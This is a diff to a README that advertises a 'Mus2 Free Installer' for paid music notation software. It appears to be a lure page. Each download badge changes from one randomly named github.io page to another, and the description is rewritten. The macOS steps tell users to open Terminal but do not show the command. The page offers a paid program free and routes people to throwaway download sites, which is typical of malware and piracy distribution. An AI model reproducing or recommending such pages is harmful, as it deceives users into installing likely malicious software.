@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Music+Notation-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Mus2 Free Installer** — Mus2 is a music notation software for microtonal music, supporting non-standard tuning systems, quarter tones, and custom tuning definitions. Works without internet access, no account required. Full offline installation.
+**💻 Mus2 Free Installer** — Mus2 is a music notation software specializing in Ottoman and Turkish classical music notation. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Mus2](https://img.shields.io/badge/⬇_Install_Mus2-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Mus2](https://img.shields.io/badge/⬇_Install_Mus2-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Mus2
 
-Mus2 is a music notation software for microtonal music, supporting non-standard tuning systems, quarter tones, and custom tuning definitions. For composers working in microtonal, just intonation, or Middle Eastern and Turkish makam music traditions, Mus2 provides notation tools that standard music notation software cannot handle.
+Mus2 is a music notation software specializing in Ottoman and Turkish classical music notation. It supports microtonal accidentals and the specialized notation system used in traditional Turkish makam music.
 
 ---
 
 ## ❌ Problem: Mus2 is hard to access
 
-- **Specialized Niche** — Only useful for microtonal and non-standard tuning composition
-- **Community Size** — Very small specialized user community
-- **Platform Limitations** — Limited platform support
-- **Learning Investment** — Microtonal music theory itself requires significant study
+- **Extremely Niche** — Specifically for Turkish classical music notation; very limited general use
+- **Windows Only** — Not available on macOS or Linux
+- **Paid License** — Requires purchase for a very specialized audience
+- **Small User Community** — Very limited resources beyond the core Turkish music community
 
 ---
 
@@ -61,9 +61,9 @@ Mus2 is a music notation software for microtonal music, supporting non-standard 
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Mus2 is a music notation software for microtonal music, supporting non-standard 
 
 <div align="center">
 
-[![⬇ Install Mus2](https://img.shields.io/badge/⬇_Install_Mus2-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Mus2](https://img.shields.io/badge/⬇_Install_Mus2-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Mus2 is a music notation software for microtonal music, supporting non-standard 
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Mus2 is a music notation software for microtonal music, supporting non-standard 
 
 ---
 
-**Mus2 Free Installer** — Mus2 is a music notation software for microtonal music, supporting non-standard tuning systems, quarter tones, and custom tuning definitions. Install without internet connection today!
+**Mus2 Free Installer** — Mus2 is a music notation software specializing in Ottoman and Turkish classical music notation. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Mus2](https://img.shields.io/badge/⬇_Install_Mus2-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Mus2](https://img.shields.io/badge/⬇_Install_Mus2-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
